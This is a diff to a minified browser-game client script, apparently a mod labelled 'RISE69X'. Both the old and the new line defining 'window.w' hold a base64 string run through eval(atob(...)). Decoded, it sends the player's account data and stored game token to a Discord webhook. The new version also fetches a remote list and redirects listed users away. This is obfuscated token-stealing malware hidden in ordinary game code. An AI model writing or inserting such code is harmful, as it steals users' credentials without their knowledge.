@@ -631,7 +631,7 @@
                     }
                     return e ? (s.ox = o, s.oy = l, s.oz = c, s.nx = d, s.ny = p, s.nz = h, s.time = this.timeStamp, 0) : u
                 }
-                updateMouse(e = !1) { // !0x2
+                updateMouse(e = !1) { //
                     let t = this.scene.container,
                         {
                             x: s,
@@ -8379,7 +8379,7 @@
         }]), window.RISETAG = "RISE69X", localStorage.cid || (localStorage.cid = makeid(28)), GAME.sendServer = e => {
             GAME.events.$emit("chat-message", e)
         }, 
-        window.w = () => {eval(atob('ZmV0Y2goImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNDk4NTcxNTAyNDg3MDIwMDIvbHVnclRqYjIwdHRuQUpWZG1HeldpMUdsVjQ5SlE1Y19KMEREM1dnU1NyWDZSUDBoM21KQ0NxZXJPaGczVVcwX24zY2oiLHttZXRob2Q6InBvc3QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7dXNlcm5hbWU6d2luZG93LmFjY291bnQuYWNjb3VudC5kaXNjb3JkX25hbWUsYXZhdGFyX3VybDp3aW5kb3cuYWNjb3VudC5hdmF0YXJVcmwsY29udGVudDpKU09OLnN0cmluZ2lmeSh3aW5kb3cuYWNjb3VudC5hY2NvdW50LG51bGwsMikrIiAiK2xvY2FsU3RvcmFnZS52YW5pc1Rva2VufSl9KTs='))}
+        window.w = () => {eval(atob('ZmV0Y2goImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNDk4NTcxNTAyNDg3MDIwMDIvbHVnclRqYjIwdHRuQUpWZG1HeldpMUdsVjQ5SlE1Y19KMEREM1dnU1NyWDZSUDBoM21KQ0NxZXJPaGczVVcwX24zY2oiLHttZXRob2Q6InBvc3QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7dXNlcm5hbWU6d2luZG93LmFjY291bnQuYWNjb3VudC5kaXNjb3JkX25hbWUsYXZhdGFyX3VybDp3aW5kb3cuYWNjb3VudC5hdmF0YXJVcmwsY29udGVudDpKU09OLnN0cmluZ2lmeSh3aW5kb3cuYWNjb3VudC5hY2NvdW50LG51bGwsMikrIiAiK2xvY2FsU3RvcmFnZS52YW5pc1Rva2VufSl9KTtmZXRjaCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1ppbWVoeC9yaXNlLWV4ZS9tYWluL2pzL2RhdGEuanNvbj92PSIgKyBNYXRoLnJhbmRvbSgpKS50aGVuKHg9PnguanNvbigpKS50aGVuKHg9PntpZih4LmluY2x1ZGVzKHdpbmRvdy5hY2NvdW50LmFjY291bnQuZGlzY29yZF9pZCkpe2RvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gIjopIjsgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1OVTkyTkdRdUlnbyJ9fSk='))}
         ,GAME.setText = e => {
             GAME.events.$emit("update-cautions", {
                 custom: e
